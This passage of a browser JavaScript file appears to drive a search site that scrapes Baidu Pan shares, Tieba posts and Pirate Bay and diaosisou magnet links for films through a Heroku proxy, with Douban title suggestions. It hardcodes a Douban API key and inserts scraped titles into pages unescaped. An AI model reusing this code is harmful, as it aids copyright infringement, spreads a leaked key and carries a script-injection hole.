
function init(){
    window['config'] = {
    //     nodeUrl:"http://127.0.0.1:8888/"
        nodeUrl:"//charon-node.herokuapp.com/"
        ,userLang:navigator.language || navigator.userLanguage
        ,key:getURLParameter("search")
        ,dataMin:screen.width>=1500?2:1
        ,bookmark:{
            "zh-CN":"收藏我,不然下次找不到哦"
            ,"default":"Bookmark me,if u have next time"
        }
        ,feedback:{
    //         "zh-CN":''
    //         ,"default":''   
            "zh-CN":'<a href="#donate" onclick="showAlipay()"><span><img src="img/hb.jpg"/>领了后赏给超龙吧</span></a>'
            ,"default":'<a href="#donate" onclick="showPayPal()"><span>Feedback?<br/> PayPal leave a message.</span></a>'       
        }
        ,hiddenHistory:{
            "zh-CN":'看过的被隐藏数量是'
            ,"default":'History be hidden,count is'
         }
        ,fetchers:["panc","panduoduo","magnet","tieba"]
        ,balance:{
            "zh-CN":'余额:'
            ,"default":"balance"
        }
        ,balanceCredit:{
            "zh-CN":'个'
            ,"default":""
        }
        ,accountTitle:{
            "zh-CN":"你的帐号:"
            ,"default":"Your account:"
        }
    };
    window['showVideos'] = [];

}

//         alert(config.userLang);
function locationParameterChanged() {
    init();
    var key = config.key;
    var input = document.getElementsByTagName("input")[0];

    input.oninput = function(e){
            if(input.value){
                setDoubanSearch(input.value,function(){

                },"searchTop");

//                 loadGoogleEntitie(input.value);
            }else{
                setDoubanTop(undefined,true,function(){
//                     loadShare();
                });
            }
    }

    if(inIframe()){
        document.querySelector(".search-form").style.display = "none";
//         document.querySelector("#searchBottom").style.display = "none";
        if(!mobilecheck()){
            document.querySelector("#data").classList.add("iniframe");
        }
        
    }else{
        input.onfocus = function(){

            setHeight(input,"50%");
    //          setFontSize(input,10);
        }
    }
    
    if(config.userLang=="zh-CN"){
        document.body.classList.add("zh-CN");
    }
    document.getElementsByTagName("form")[0].onsubmit = function(){
         setHeight(input,"15%");
//          setFontSize(input,100,"1.5em");
    }
    isDirect();
//     window.onclose = window.onunload= function(e){
//         if(isShowBookmark()){
//             e.preventDefault();
//             addBookmark();
//         }
//     } 
    if(!key){
        input.focus();
        input.setAttribute("required","required");
        var subjects = JSON.parse(localStorage.getItem("doubanSearchs"))||[];
        
        if(subjects){
            setDoubanSearchList(subjects,"searchTop",true);
//             loadShare();
        }
        if(subjects.length<10){
            setDoubanTop(undefined,true,function(){
                loadShare();
            });
        }else{
            loadShare();
        }
//         syncIsIt().getAll();
        
        subjects = null;
        return;
    }

    input.value=key;
    document.getElementsByTagName("title")[0].innerText=key+" in pan.baidu.com sharing";
//     setMessageForm(key);
    try{
        var self = syncIsIt().getBykey(key);
        self.setLocalIframe(self.data);
    }catch(e){
        console.log(e);
    }
    var fetcherCache = JSON.parse(sessionStorage.getItem(config.key)||"{}");
    hideShowedCache(fetcherCache.showVideos);
    loadFetchers(fetcherCache.fetchers,config.key);
    fetcherCache = null;
    setDoubanSearch(input.value,function(){
            
        loadShare(input.value);
        
    },"searchBottom");
    loadGoogleEntitie();

    
    if(inIframe()){
        return;
    }
    if(isShowBookmark()){
        addBookmark();
    }
//     setMagnetTech();
}
function hideShowedCache(showVideos){
    if(showVideos){
        document.getElementById("history").innerHTML = config.hiddenHistory.lang()+' <a class="history-number" href="javascript:" onclick="showHideVideos()" title="Show">'+showVideos.length+'</a>';
    }
    showVideos = null;
}
function showHideVideos(){
   sessionStorage.removeItem(config.key);
   location.reload();
}
function loadFetchers(fetchers,key){

    (fetchers||config.fetchers).map(function(fetcher,index){
        fetcher = fetcher||config.fetchers[index]
        if(typeof fetcher === "object"&&fetcher.host){
            window[fetcher.host] = eval(fetcher.host+"Fetcher")(key,fetcher);
        }else if(typeof fetcher === "string"){
            if(fetcher=="tieba"&&config.userLang!="zh-CN"){

            }else{
                window[fetcher] = eval(fetcher+"Fetcher")(key);
            }
        }
    });
    fetchers = null;
}
function setHeight(input,height,isTransition){
    try{
        if(input.animate){
            input.style.transition="initial";
            input.animate([
              // keyframes
              { height: height }
            ], { 
              // timing options
              duration: 200,
              iterations: 1
            });
            setTimeout(set,200);
        }else{
            set();
        }
    }catch(e){
        set();
    }
    function set(){
        input.style.height = height;
    }
}

function setFontSize(input,maxLength,fontSize){
    function min(x,y){
        return x-y<0?x:y;
    }
    function max(x,y){
        return x-y<0?y:x;
    }
    if(!fontSize){
        var fontSize = max(min(window.innerWidth,window.innerHeight)/maxLength,16)+"px";

    }
    input.style.fontSize = fontSize;
}

function changeHash(form){
    if(location.hash.substr(1)==form.search.value){
        Location.reload();
    }else{

        location.hash = "#"+form.search.value;
    }
    return false;
}
function setMoreFetcher(button){
    button.style.display="none";
    var key = config.key;
    window.panduoduo=panduoduoFetcher(key);
    window.tieba=tiebaFetcher(key);
}
function setMessageForm(key){

    var sms = new String("有 {0} 吗？\r找到后发给我邮箱或手机\r：");
    var messageForm =  document.getElementById("messageForm");
    if(messageForm){
        messageForm.message.value = sms.format(key);
        messageForm.onsubmit=function(e){
            e.preventDefault();

            var submit = messageForm.querySelector('[type="submit"]')
            var tabMessage = document.getElementById("tab-message");

            submit.classList.add("loading");
//             var uri = "http://127.0.0.1:8888/cross";
            var uri = config.nodeUrl+"cross"
            var method = messageForm.method;
            var data = {
                "crossUrl":messageForm.action
                ,"crossMethod":method
                ,"message":messageForm.message.value
            }
            var fn = function(data){
                console.log(data+messageForm.action);
                tabMessage.click();
                submit.classList=[];
                tabMessage.classList=[];
                tabMessage.classList.add("success");
            }
            var error = function(){
                submit.classList=[];
                tabMessage.classList=[];
                tabMessage.classList.add("error");
            }

            ajax(uri,fn,error,method,JSON.stringify(data));

            return false;
        }
    }
}
function loading(is,id){           
    var loadingDoc = document.getElementById(id?id:"pancLoading");
    loadingDoc.style.display=is?"block":"none";
}


function ShowMore(){

    var length = window.showVideos.length;
    var ways = [panc,tieba,magnet,panduoduo];

//     var ways = [panduoduo];
    if(length<1){
        length = 1;
    }
    setMoreIframe(ways,0,length);

    
}
function setMoreIframe(ways,index,length){
    if(!index){
        index = 0;
    }
    var length = length || 1;
    if(!ways[index]){
        confirm("noneTemplate",true);
        return;
    }
    var videos = ways[index].videos;
    var than = length - videos.length;

    if(videos.length == 0){
        setMoreIframe(ways,index+1,than);
    }else if(than>0){
        ways[index].setIframe(videos,videos.length,window.showVideos,true);
        setMoreIframe(ways,index+1,than);
    }else{
        ways[index].setIframe(videos,length,window.showVideos,true);
    }

}
function fetcher(parameter){
    var serf = {};
    serf.dataMin = config.dataMin||1;
    serf.host = parameter.host;
    serf.videos = [];
    serf.fetchUrl = parameter.fetchUrl;
    serf.parseVideos = parameter.parseVideos;
    serf.setIframe = function (videos,length,showVideos,doNotCheckInvalid){
        
        if(parameter.setIframe){
            parameter.setIframe(videos,length,showVideos,doNotCheckInvalid,serf);
        }else{
            var videos = videos.splice(0,length);
            videos.map(function(video,index){
                var success = function(){
                    setIframe(video,index==0);
                    showVideos.push(video);
                };
                if(doNotCheckInvalid){

                    success();
                }else{
                    serf.checkInvalid(video,function(){
                        if(index>=videos.length-1){
                            serf.setIframe(serf.videos,1,showVideos);
                        }
                    },success);
                }
            });
            
        }

        serf.progress.setNum(serf.videos.length);
    }

    serf.checkInvalid = function(video,error,success){
        if(parameter.checkInvalid){
            var uri = config.nodeUrl+"cross?api="+video.url;
            ajax(uri,function(data){
                var index = data.indexOf("百度网盘-链接不存在");

                if(index<0){
                    success();
                }else{
                    error();
                }
                data=null;
            },error);
        }else{
            success();
        }
    }
    serf.onLoaded=function(){
        if(parameter.onLoaded){
            parameter.onLoaded(serf);
        }else{

            serf.setIframe(serf.videos,serf.dataMin,window.showVideos);
        }
    }
    serf.fetch = parameter.fetch;
    serf.load = function (cache){
        serf.progress = innerProgress(serf.host,serf.fetchUrl);
        var success = function(html){
            var progress = serf.progress;
            var videos = (typeof html== "object")?html:serf.parseVideos(html);
            if(!videos||videos.length===0){
                progress.none();
//                 confirm("noneTemplate");
                return;
            }
            progress.success(videos.length);
            serf.videos = videos;
            
            serf.onLoaded();
            html = null;

        };
        if(cache){
            setTimeout(success(cache.videos),100);
        }else{
            serf.fetch(serf.host,serf.fetchUrl,success);
        }
        return serf;
    }
    window[serf.host] = serf;
    return serf.load(parameter.cache);
}

function panduoduoFetcher(key,cache){
    var parameter = {};
    parameter.cache = cache;
    parameter.host = "panduoduo";
    parameter.fetchUrl = "http://www.panduoduo.net/s/comb/n-"+key+"&ty-bd&f-f4";
    parameter.fetch = fetch;
    parameter.parseVideos = function(html){
        return parseList(html,".search-page .row");
        function parseList(html,select){
            var videos = [];
            var el = document.createElement( 'html' );
            el.innerHTML = html;

            var as = el.querySelectorAll(select);
            for(var i = 0;i<as.length;i++){
                if(videos.length>10){
                    break;
                }
                var img = as[i].querySelector('[title="百度云盘资源"]');
                var type = as[i].querySelector('[href^="/c/"]');
                if(img&&type.innerHTML=="视频"){
                    var a = as[i].querySelector("a[href^='/r/']");
                    var video = {ref:parameter.host,name:a.innerHTML,url:"http://www.panduoduo.net"+a.pathname};
                    videos.push(video);
                }

    //                 fetchDetal(video,i===0);

            }
            html = el = els = null;
            return videos;
        }

    }
    parameter.onLoaded = function(fetcher){

//         fetcher.setIframe(fetcher.videos,1,window.showVideos);
//         clearInvalid(fetcher,function(video){
//             fetcher.setIframe([video],1,window.showVideos);
//             fetcher.progress.setNum(fetcher.videos.length);

//         });
    }
    parameter.setIframe = function (panduoduoVideos,length,showVideos){
        var videos = panduoduoVideos.splice(0,length);
        videos.forEach(function (item, index, array) {

            showVideos.push(item);
            fetchDetal(item,index===0);
        });
        
        function fetchDetal(video,isSrc){
            
            var wrapper = setIframe(video,false,true);
            var success = function(html){

                var url = parseDetail(html,"a.dbutton2");
                if(!url){
                    parameter.setIframe(videos,1,window.showVideos);

                }
                if(window.showVideos&&isExist(url,window.showVideos)){
                    return;
                }
                video["url"] = url;
                function parseDetail(html,select){
                    var urlIndex = html.indexOf('"dbutton2" href="')+'"dbutton2" href="'.length;
                    var href = html.substring(urlIndex,html.indexOf('"',urlIndex));
//                     var url = getURLParameter("url",href);
                    return href;
                }
                url = config.nodeUrl+"cross?api="+url;
                setIframeUrl(url,wrapper,isSrc);


            }
            fetch("panduoduo",video.url,success);
        }
//         function fetchGo(video,isSrc){
//             fetch("panduoduo",video.url,success);
//         }
    }
    
    return fetcher(parameter);
    
}


function pancFetcher(key,cache){

    var parameter = {};     parameter.cache = cache;
    parameter.host = "panc";
    parameter.fetchUrl = "https://www.panc.cc/s/"+key+"/td";
    parameter.fetch = nodeFetch;
    parameter.onLoaded = function(fetcher){

        fetcher.setIframe(fetcher.videos,fetcher.dataMin,window.showVideos);
        clearInvalid(fetcher,function(video){
            fetcher.setIframe([video],1,window.showVideos);
            fetcher.progress.setNum(fetcher.videos.length);

        });
    }
    parameter.setIframe = function (videos,length,showVideos,doNotCheckInvalid,fetcher){
        var videos = videos.splice(0,length);
        videos.map(function(video,index){
            if(!checkExistUk(video,showVideos)){
                setIframe(video,index==0);
                showVideos.push(video);
            }else{
                
                videos.splice(videos.indexOf(video), 1);
                fetcher.progress.setNum(fetcher.videos.length);
//                 parameter.setIframe(videos,1,showVideos);
            }
        });
        videos = null;
    }

    parameter.parseVideos = function(html){
        var videos = parseHref(html,".a_url");
        

        function parseHref(html,select){
            var videos = [];
            var el = document.createElement( 'html' );
            el.innerHTML = html;
            var as = el.querySelectorAll(select);
            for(var i = 0;i<as.length;i++){
                videos.push({name:as[i].previousElementSibling.innerHTML,url:as[i].href});
            }
            return videos;
        }
        return videos;
    }
//     parameter.checkInvalid = true;
    
    
    return fetcher(parameter);

}

function fetch(host,api,success){

//     confirm("loadingTemplate");
    var url = encodeURI(config.nodeUrl+"fetch?api="+api);
//     var url = encodeURI("http://127.0.0.1:8888/fetch?api="+api);
//     var data = JSON.stringify({crossUrl:api});
    try{
        var error = function(){
            var videos = [];
//             confirm("noneTemplate");
            progress(host).error();
//             setIframe(videos,true,true);
        }
        ajax(url,success,error);

    }catch(e){
        error();
    }
}
function nodeFetch(host,api,success){

//     confirm("loadingTemplate");
    var url = encodeURI(config.nodeUrl+"fetch?npm=node-fetch&api="+api);
//     var url = encodeURI("http://127.0.0.1:8888/fetch?npm=node-fetch&api="+api);
//     var data = JSON.stringify({crossUrl:api});
    try{
        var error = function(){
            var videos = [];
//             confirm("noneTemplate");
            progress(host).error();
//             setIframe(videos,true,true);
        }
        ajax(url,success,error);

    }catch(e){
        error();
    }
}
function cross(host,api,success){

//     confirm("loadingTemplate");
//     var url = encodeURI("http://127.0.0.1:8888/cross?api="+api);

    var url = encodeURI(config.nodeUrl+"cross?api="+api);
    try{
        var error = function(){
            var videos = [];
//             confirm("noneTemplate");
            progress(host).error();
//             setIframe(videos,true,true);
        }
        ajax(url,success,error);

    }catch(e){
        error();
    }
}



// function setIframe(videos,isSrc,waitUrl,templateId) {
    
//     templateId = templateId?templateId:"videoTemplate";
//     var template = document.getElementById(templateId).innerHTML;

//     var dataBox =  document.getElementById("data");
//     for(var i=0;i<videos.length;i++){
// //         if(window.showVideos&&isExist(videos[i],window.showVideos)){
// //             continue;
// //         }
//         var wrapper= document.createElement('div');
//         wrapper.innerHTML= template;
//         a = wrapper.children[0];
//         a.innerHTML=videos[i].name;
//         var url = videos[i].url;
//         a.href=videos[i].refUrl||url;
//         if(!waitUrl){
//             if(templateId=="videoTemplate"){
//                 var index = url.indexOf("//");
//                 url = url.substr(index>=0?index:0);
//             }
//             setIframeUrl(url,wrapper,isSrc&&i==0,templateId);
        
//         }

        
//         dataBox.appendChild(wrapper);
//     }
//     confirm("");
//     dataBox = iframe = videos = null;
//     return wrapper;
// }
function setIframe(video,isSrc,waitUrl,templateId,dataBoxId){
    if(video.ref&&video.ref=="magnet"){
        templateId = "magnetTemplate"
    }
    templateId = templateId?templateId:"videoTemplate";
    var template = document.getElementById(templateId).innerHTML;

    var dataBox =  document.getElementById(dataBoxId||"data");
    var wrapper= document.createElement('div');
    wrapper.classList.add("video-item")
    wrapper.innerHTML= template;
    var a = wrapper.children[0];
    var url = video.url;
    if(video.key&&!config.key){
        a.href="?search="+video.key;
        a.innerHTML=video.key;
        a.target = "";
    }else{
        a.innerHTML=video.name;
        a.href=video.refUrl||url;
    }

    if(templateId=="videoTemplate"){
        var index = url.indexOf("//");
        url = url.substr(index>=0?index:0);
    }
    var isIt =  wrapper.querySelector("[name='isIt']");
    isIt.value = JSON.stringify(video);
    if(isItTrue(isIt)||video.key){
        isIt.checked = true;
    }
    var key = video.key||config.key;
    isIt.title="Is this "+key+"?"
    isIt.dataset.key= key;

    if(dataBox.querySelector("iframe[data-src='"+url+"']")||dataBox.querySelector("a[href='"+url+"']")){
                
    }else{
        dataBox.appendChild(wrapper);
    }
    if(!waitUrl){
        setIframeUrl(url,wrapper,isSrc,templateId);

    }
    var fetcherCache = JSON.parse(sessionStorage.getItem(config.key)||"{}");
    fetcherCache.fetchers=objectsByStrings(config.fetchers);
    fetcherCache.showVideos=(fetcherCache.showVideos||[]).concat(showVideos);
    sessionStorage.setItem(config.key, JSON.stringify(fetcherCache)); 
//     confirm("");
    fetcherCache = dataBox = iframe = null;
    return wrapper;
}
function objectsByStrings (strings){
    var objects = [];
    strings.map(function(s){
        objects.push(window[s]);
    });
    return objects;
}
function setIframeUrl(url,wrapper,isSrc,templateId){

    if(!url){
        wrapper.removeChild(iframe);
    }else{

        templateId = templateId?templateId:"videoTemplate";
        if(templateId=="videoTemplate"){
            var iframe = wrapper.querySelector("iframe");
            if(isDisableScript(url)){
                iframe.sandbox="allow-same-origin allow-popups allow-forms allow-pointer-lock";
            }
            iframe.dataset.src=url;
            if(isSrc){
                iframe.src=url;
            }
            addVideosHandler(iframe);


        }else if(templateId=="magnetTemplate"){

            var code= wrapper.querySelector("code");;
            code.innerHTML = url;
        }
    }

}
function isExist(url,videos,key){
    for(var i=0;i<videos.length;i++){
        var key = key || "url";
        if(videos[i][key]==url){
            return {i:i};
        }
    }
    return false;
}
function isDisableScript(url){
    if(url.indexOf("pan.baidu.com/pcloud/album/file")>0){
        return true;
    }
    return false;
}

function load(uri,fn){
    var request = new XMLHttpRequest();
    request.open('PUT', uri, false); 
    request.send(null);
    if (request.status === 200) {
      return request.responseText;
    }
}

function getURLParameter(name,url) {
  return decodeURIComponent((new RegExp('[?|&]' + name + '=' + '([^&;]+?)(&|#|;|$)').exec(url?url:location.search) || [null, ''])[1].replace(/\+/g, '%20')) || null;
}


function isElementInViewport (el) {

    //special bonus for those using jQuery
    if (typeof jQuery === "function" && el instanceof jQuery) {
        el = el[0];
    }

    var rect = el.getBoundingClientRect();

    return (
        rect.top >= 0 &&
        rect.left >= 0 &&
        rect.bottom <= (window.innerHeight || document.documentElement.clientHeight) && /*or $(window).height() */
        rect.right <= (window.innerWidth || document.documentElement.clientWidth) /*or $(window).width() */
    );
}
function onVisibilityChange(el, callback) {
    var old_visible;
    return function () {
        var visible = isElementInViewport(el);
        if (visible != old_visible) {
            old_visible = visible;
            if (typeof callback == 'function') {
                callback();
            }
        }
    }
}
function addVideosHandler(iframe){
    var handler = onVisibilityChange(iframe, function() {
        if(!iframe.src){
            iframe.src = iframe.dataset.src;
        }
    });
    if (window.addEventListener) {
        addEventListener('DOMContentLoaded', handler, false); 
        addEventListener('load', handler, false); 
        addEventListener('scroll', handler, false); 
        addEventListener('resize', handler, false); 
    } else if (window.attachEvent)  {
        attachEvent('onDOMContentLoaded', handler); // IE9+ :(
        attachEvent('onload', handler);
        attachEvent('onscroll', handler);
        attachEvent('onresize', handler);
    }
}

function ajax(uri,fn,error,method,data,contentType){
    var request = new XMLHttpRequest();
    request.open(method||"GET", uri);
    request.setRequestHeader("Content-Type", contentType||"text/plain;charset=UTF-8");

    try{
      request.send(data||null);
    }catch(e){
        error();
    }
    request.onload = function(e) {
        if (this.status == 200) {
                fn(this.response,error);
//             try{
//             }catch(e){
//                 error();
//             }
        }else{
          error();
        }
    };
    request.onerror = error;
//     request.timeout = 20000; // time in milliseconds
//     request.ontimeout = function (e) {
//       // XMLHttpRequest timed out. Do something here.
//       request.abort();
//       error();
//     };
    return request;
}

function isEnglish(string){
    var notEnglish = /[^\x00-\x7F]+/;
    if (notEnglish.test(string)){
        return false;
    }
    return true;
}
function thepiratebayFetcher(key,cache){
    return magnetFetcher(key,cache);
}
function diaosisouFetcher(key,cache){
    return magnetFetcher(key,cache);
}
function magnetFetcher(key,cache){
    var parameter = {};     parameter.cache = cache;

    if(isEnglish(key)){
//         return null;
//     }
        parameter.host = "thepiratebay";
        parameter.fetchUrl = "https://thepiratebay.org/search/"+key+"/0/99/0";
        parameter.parseVideos = function(html){
            var videos = parseList(html);
            return videos;

            function parseList(html){

                var videos = [];
                var el = document.createElement( 'html' );
                el.innerHTML = html;

                var els = el.querySelectorAll("#searchResult tbody tr");
                
                for(var i = 0;i<els.length;i++){
        //             if(i>10){
        //                 break;
        //             }
                    var name = els[i].querySelector(".detLink").innerHTML;
                    var url = els[i].querySelector("a[href^='magnet:']").href;
                    var video = {ref:"magnet",name:name,url:url};
                    videos.push(video);
        //                 fetchDetal(video,i===0);

                }
                html = el = els = null;
                return videos;
            }
        };

        parameter.fetch = cross;
        parameter.onLoaded = function(fetcher){
            fetcher.setIframe(fetcher.videos,fetcher.dataMin*2,window.showVideos);
        }
    }else{
        parameter.host = "diaosisou";
        parameter.fetchUrl = "http://www.diaosisou.org/list/"+key+"/1";
        parameter.parseVideos = function(html){
            var videos = parseList(html);
            return videos;

            function parseList(html){

                var videos = [];
                var videos2 = [];
                var el = document.createElement( 'html' );
                el.innerHTML = html;

                var els = el.querySelectorAll(".mlist>li");
                el = null;
                for(var i = 0;i<els.length;i++){
        //             if(i>10){
        //                 break;
        //             }
                    var name = els[i].querySelector("a[name='file_title'").innerHTML;
                    var url = els[i].querySelector("a[href^='magnet:']").href;
                    var video = {ref:"magnet",name:name,url:url};
                    if(video.name.length>=70){
                        videos2.push(video);
                    }else{
                        videos.push(video);
                    }
        //                 fetchDetal(video,i===0);
                    

                }
                videos.concat(videos2);
//                 for(var i=0;i<videos.length;i++){
//                     if(videos[i].name.length>=70){
//                         videos.move(i, videos.length-1)
//                     }
//                 }
                html = el = els = null;
                return videos;
            }
        };
        parameter.fetch = nodeFetch;
        parameter.onLoaded = function(fetcher){
            if(fetcher.videos[0].name.length<70){
                fetcher.setIframe(fetcher.videos,1,window.showVideos);
            }
        }
    }
    

//     parameter.setIframe = function (videos,length,showVideos){
//         var videos = videos.splice(0,length);
//         window.showVideos = window.showVideos.concat(videos);
//         videos.map(function(video,index){
//             setIframe(video,true,false,"magnetTemplate");
//         });
//     }
    
    window[parameter.host] = fetcher(parameter);
    return window[parameter.host];

    
}

function loadError (oError) {
     console.log("The script " + oError.target.src + " is not accessible.");

//   throw new URIError("The script " + oError.target.src + " is not accessible.");
}

function importScript (sSrc, fOnload) {
  var oScript = document.createElement("script");
  oScript.type = "text\/javascript";
  oScript.onerror = loadError;
  if (fOnload) { oScript.onload = fOnload; }
  if( document.currentScript){
        document.currentScript.parentNode.insertBefore(oScript, document.currentScript);

  }else{
      document.body.appendChild(oScript);
  }
  oScript.src = sSrc;
  oScript.abort = function(){
    return trigger(oScript,'error');
  };
  return oScript;


  
}
//[trigger 触发事件]
function trigger(element,event){
  if( !typeof event == "string" ) {
    return;
  }
  if ( element.dispatchEvent ){
    var evt = document.createEvent('Events');// initEvent接受3个参数
    evt.initEvent(event, true, true);
    element.dispatchEvent(evt);
  }else if ( element.fireEvent ){ //IE
    element.fireEvent('on'+event);
  }else{
    element['on'+event]();
  }
}
function progress(host){

    var _progress = document.getElementById(host+'Progress');
    if(_progress.interval){
        return _progress;
    }
    _progress.init = function(){

        _progress.parentNode.parentNode.classList=[];
        _progress.value = 0;
        _progress.interval=setInterval(frame, 10);
    }
//     _progress.is_progress = true;
    _progress.success=function(length){

        _progress.parentNode.parentNode.classList=[];
        _progress.parentNode.parentNode.classList.add("success");
        clearInterval(_progress.interval);
        if(length){
           _progress.nextSibling.innerHTML = "<em>"+length+"</em>";
        }
    };
    _progress.setNum=function(length){
        if(length>0){
            _progress.success(length);
        }else{
            _progress.none();
        }
    }
    _progress.none = function(){
        _progress.parentNode.parentNode.classList=[];
        _progress.parentNode.parentNode.classList.add("none");
        clearInterval(_progress.interval);
        _progress.nextSibling.innerHTML = "<em>"+0+"</em>";
    }
    _progress.error = function(){
        _progress.parentNode.parentNode.classList=[];
        _progress.parentNode.parentNode.classList.add("error");
        clearInterval(_progress.interval);
    }
    _progress.parentNode.onclick=function(){
        var fetcher = window[host];
        if(fetcher&&fetcher.videos.length){
            var length = fetcher.videos.length;
            var showLength = showVideos.length;
            length = length>showLength?showLength:length;
            if(host=="panduoduo"){
                length = 1;
            }
            setMoreIframe([fetcher],0,length);
        }
    }
    _progress.nextSibling.nextSibling.onclick=function(){
        var fetcher = window[host];
        if(fetcher){
            fetcher.load();
        }
    }
    function frame() {
        if (_progress.value >= 20000) {
            clearInterval(_progress.interval);
            _progress.error();
        } else {
            _progress.value  = _progress.value + 10;
        }
    }
    return _progress;
}

function innerProgress(host,fetchUrl){
    var progressGroup = document.getElementById("progressGroup");
    progressGroup.classList.add("show");
    var  progressD= document.getElementById(host+"Progress");
    if(!progressD){
        var html = '<li><a target="_blank" href="'+fetchUrl+'" title="'+host+'"><i class="'+host+'"></i></a><span class="more" href="javascript:return void()"><progress max="20000" id="'+host+'Progress"></progress><span class="num"></span><span class="reloadSingle" title="Reload"></span></span>';
        var child = progressGroup.querySelector("li.more");
        beforeHTML(progressGroup,html,child);
    }
    var _progress  = progress(host);

    _progress.init();
    return _progress;
}
function appendHTML(d,html){
    var wrapper= document.createElement('div');
        wrapper.innerHTML= html;
        d.appendChild(wrapper.children[0]);
}
function beforeHTML(d,html,child){
    var wrapper= document.createElement('div');
        wrapper.innerHTML= html;
        d.insertBefore(wrapper.children[0],child);
}

// function changeShowVideosNeedCheck(video,url){
//     if(!url){
//         showVideos.push(video);
//     }else{
//         video["url"]=url;
//     }
//     check(video["url"],function(){
//         showVideos = showVideos.splice(video, 1);
//     })
// }
function checkInvalid(url,error,success){

    var uri = config.nodeUrl+"cross?api="+url;
    ajax(uri,function(data){
        var index = data.indexOf("百度网盘-链接不存在");
        
        if(index<0){
            success();
        }else{
            error();
        }
        data=null;
    },error);
}
function clearInvalid(fetcher,successOne){
    try{
        var array = fetcher.videos;
        array.map(function(o) { 
    
            var isSortUrl =function(url){
                var index = url.indexOf("pan.baidu.com/s/");
                return index>=0?true:false;
            }
            if(!isSortUrl(o["url"])){
                checkInvalid(o["url"],function(){
                    array.splice(array.indexOf(o), 1);
                    fetcher.progress.setNum(array.length);
                },function(){
                    if(successOne){
                        successOne(o);
                        successOne = false;
                    }
                })
            }
        });
    }catch(e){

    }
    

}

function setDoubanList(value){
    var api = "https://api.douban.com/v2/movie/search?q="+value;
    var uri = config.nodeUrl+"cross?api="+api;
    ajax(uri,function(data){
        var html  = "";
        var subjects = JSON.parse(data).subjects;
        for(var i = 0;i<3&&i<subjects.length;i++){
            html += searchToHtml(subjects[i].original_title,subjects[i].images.medium);
            if(i<1&&subjects[i].original_title!=subjects[i].title){
                html += searchToHtml(subjects[i].title,subjects[i].images.medium);

            }
        }
        var doubanListD = document.getElementById("doubanList");
        doubanListD.innerHTML=html;
        doubanListD.style.display = "block";
        data=html=subjects=doubanListD=null;
    });
}
function setDoubanSearch(value,success,id){

    var value = value||config.key;
    if(!value){
        return;
    }
    window.doubanListId = id;
//     if(doubanListD.innerHTML){
//         return;
//     }
    if(window.doubanRequest){
        window.doubanRequest.abort();
    }
    if(id!="searchBottom"){
        var api = "https://api.douban.com/v2/movie/search?callback=setDoubanSearchCallback&q="+value;
        window.doubanRequest = importScript(api,success);  
    }else{
        var api = "https://api.douban.com/v2/movie/search?q="+value;
        var uri = config.nodeUrl+"cross?api="+api;
        window.doubanRequest = ajax(uri,function(data){
            setDoubanSearchCallback(JSON.parse(data));
//             var subjects = JSON.parse(data).subjects;
//             if(subjects&&subjects[0]){
//                 setDoubanSearchList(subjects,id);
//                 var searchs = JSON.parse(localStorage.getItem("doubanSearchs"))||[];
//                 if(!isExist(subjects[0].title,searchs,"title")){
//                     searchs.unshift(subjects[0]);
//                     searchs = JSON.stringify(searchs);
//                     localStorage.setItem("doubanSearchs",searchs);
//                 }
//                 searchs=subjects=data=null;
//             }

            success();
        });
    }  

}
function setDoubanSearchCallback(data){
    var subjects = data.subjects;
    if(subjects&&subjects[0]){
        setDoubanSearchList(subjects,window.doubanListId);
        var searchs = JSON.parse(localStorage.getItem("doubanSearchs"))||[];
        var indexO = isExist(subjects[0].title,searchs,"title");
        if(!indexO){
            searchs.unshift(subjects[0]);
            searchs.length = searchs.length>20?20:searchs.length;
            
        }else{
            searchs.move(indexO.i,0);
        }
        searchs = JSON.stringify(searchs);
        localStorage.setItem("doubanSearchs",searchs);
        subjects=searchs=data=null;
    }
}
function setDoubanSearchList(subjects,id,islocal){
        var doubanListD = document.getElementById(id)||document.querySelector(".doubanList");

        var html  = "";
        for(
            var i = 0;
            islocal?(i<20&&i<subjects.length):(i<5&&i<subjects.length);
            i++
        ){
            var title1 = (config.userLang=="zh-CN")?subjects[i].title:subjects[i].original_title;
            var title2 = (config.userLang=="zh-CN")?subjects[i].original_title:subjects[i].title;
            html += searchToHtml(title1,subjects[i].images.medium);
            if(i<1&&title1!=title2&&!islocal){
                html += searchToHtml(title2,subjects[i].images.medium);

            }
        }
        if(true&&!islocal){
//                     html += '<a target="_blank" href="https://movie.douban.com/annual/2017" class="movieannual2017"></a>';

        }

        doubanListD.classList.add("doubanList");
        doubanListD.innerHTML=html;
        html=null;
}
function searchToHtml(title,image){
    var isSame = "";
    if(config.key!=title){
        isSame = 'href="?search='+encodeURIComponent(title)+'"';

    }
    var imgHtml = "";
    if(image){
        imgHtml = '<img src="'+image+'"/>';
    }
    return '<a '+isSame+' >'+imgHtml+'<span>'+title+'<span></a>';
    
}
function setDoubanTop(tab,isLazy,success){
    
//     if(doubanListD.innerHTML){
//         return;
//     }
    if(window.doubanRequest){
        window.doubanRequest.abort();
    }


    var random = parseInt(Math.random()*230);
    var api = "https://api.douban.com/v2/movie/top250?apikey=0df993c66c0c636e29ecbb5344252a4a&start="+random+"&&callback=setDoubanTopCallback";
    window.doubanRequest = importScript(api,success);
}

function setDoubanTopCallback(data){
    var html  = "";
    var subjects = data.subjects;
    var value = config.key;
    for(var i = 0;i<subjects.length;i++){
        var subject = subjects[i];

        var title = (config.userLang=="zh-CN")?subjects[i].title:subjects[i].original_title;
        html += searchToHtml(title,subjects[i].images.medium);

    }
//         html += '<a target="_blank" href="https://movie.douban.com/top250" class="douban-more icon-douban">Top 250<i>﹀</i></a>';
    html += '<a target="_blank" href="https://movie.douban.com/annual/2017" class="movieannual2017"></a>';
    var doubanListD = document.getElementById("searchTop")||document.querySelector(".doubanList");
    doubanListD.innerHTML+=html;
    doubanListD.classList.add("doubanList");
    data=html=subjects=doubanListD=null;
}

function setMagnetTech(tab){
    if(!tab){
        var tab = document.getElementById("tab-Magnet");
//         tab.checked = true;
        tab.parentNode.style.display="inline-block";
        return;

    }else if(!tab||tab.checked == false){
        return;
    }
    setOtherClose(tab);
    var contentD = tab.nextElementSibling.nextElementSibling;
    contentD.innerHTML = document.getElementById("magnetTechTemplate").innerHTML;
}

function reloadIframe(button){
    button.previousElementSibling.src=button.previousElementSibling.src
}



function tiebaFetcher(key,cache){

    var parameter = {};     parameter.cache = cache;
    parameter.host = "tieba";
    parameter.fetchUrl = "http://tieba.baidu.com/f/search/res?ie=utf-8&qw="+key+" pan.baidu";
    parameter.fetch = cross;

    parameter.parseVideos = function(html){
        var videos = parseHref(html,".s_post");
//         clearInvalid(videos);
        return videos;

